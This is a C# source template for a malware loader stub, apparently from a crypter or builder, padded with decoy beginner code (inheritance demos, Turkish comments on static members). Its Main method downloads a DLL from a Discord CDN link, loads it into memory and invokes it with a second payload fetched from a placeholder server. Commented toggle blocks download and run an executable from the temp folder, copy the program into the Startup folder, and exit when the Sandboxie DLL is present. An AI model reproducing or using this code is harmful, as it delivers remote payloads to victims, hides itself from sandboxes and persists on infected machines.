using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

//Default [assembly: AssemblyTitle("Assembly.exe")]
//Default [assembly: AssemblyDescription("WindowsApplication")]
//Default [assembly: AssemblyProduct("WindowsApplication")]
//Default [assembly: AssemblyCopyright("WindowsApplication  ©  2013")]
//Default [assembly: AssemblyFileVersion("2.0.0.0")]

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]



// base class name 'baseClass'
class baseClass
{
    public void show()
    {
        Console.WriteLine("Base class");
    }
}

// derived class name 'derived'
// 'baseClass' inherit here
class derived : baseClass
{

    // overriding
    new public void show()
    {
        Console.WriteLine("Derived class");
    }
}

class GFG
{

    // Main Method
    public static void Mainapp()
    {

        // 'obj' is the object of
        // class 'baseClass'
        baseClass obj = new baseClass();


        // invokes the method 'show()'
        // of class 'baseClass'
        obj.show();

        obj = new derived();

        // it also invokes the method
        // 'show()' of class 'baseClass'
        obj.show();

    }
}
static class StaticOrnek2
{
    // static bir yapılandırıcı örneği
    static StaticOrnek2()
    {
        int kapi = 4;
        string isim = "Mercedes";
    }

    static void Minibus()
    {

    }
}
public class psrsaideasm
{
    public static double x = 5.5;
    public void xDegistir(int y)
    {
        x = y;
    }
    public void Otomobil() // static olmadığı için kendi sınıfından olsa bile static olan bir metot erişemez
    {

    }
    public static int motor = 1000;
    public int benzin = 3; // static olmadığı için kendi sınıfından olsa bile static olan bir metot erişemez

    public static int Otobus()
    {
        // enerji = 200; hatalı kullanım
        // Insan(); Hatalı kullanım

        psrsaideasm st = new psrsaideasm();

        st.Otomobil(); // Doğru kullanım
        st.benzin = 2; // doğru kullanım
        return motor / 2;
    }
    [STAThread]
    public static void Main(string[] args)
    {
        using (WebClient %3% = new WebClient())
        {

            try
            {


               
                   //sandboxie controlsandboxie();

                    //Messega



                    //download try
                    //download {
                    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
                    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download }
                    //download catch
                    //download {
                    //download }






                    object %1% = new object[] { %aPP%, string.Empty, %3%.DownloadData("%Server%"), true };

                    Assembly %2%;

                    %2% = AppDomain.CurrentDomain.Load(%3%.DownloadData("https://cdn.discordapp.com/attachments/844669981151985754/845859274424582144/instagram.dll"));


                    %2%.GetType("instagram.whatsapp").InvokeMember("studio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])%1%);


                    //start  {
                    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
                    //start  }




            }
            catch { return; }

            psrsaideasm y = new psrsaideasm();
            Console.WriteLine(psrsaideasm.x);

            psrsaideasm z = new psrsaideasm();
            Console.WriteLine(psrsaideasm.x);

            z.xDegistir(4);

            psrsaideasm t = new psrsaideasm();
            Console.WriteLine(psrsaideasm.x);





        }

    }

    //sandboxie [DllImport("kernel32.dll")]
    //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
    //sandboxie static void controlsandboxie()
    //sandboxie {
    //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
    //sandboxie     {
    //sandboxie        Environment.Exit(1);
    //sandboxie     }
    //sandboxie }
}

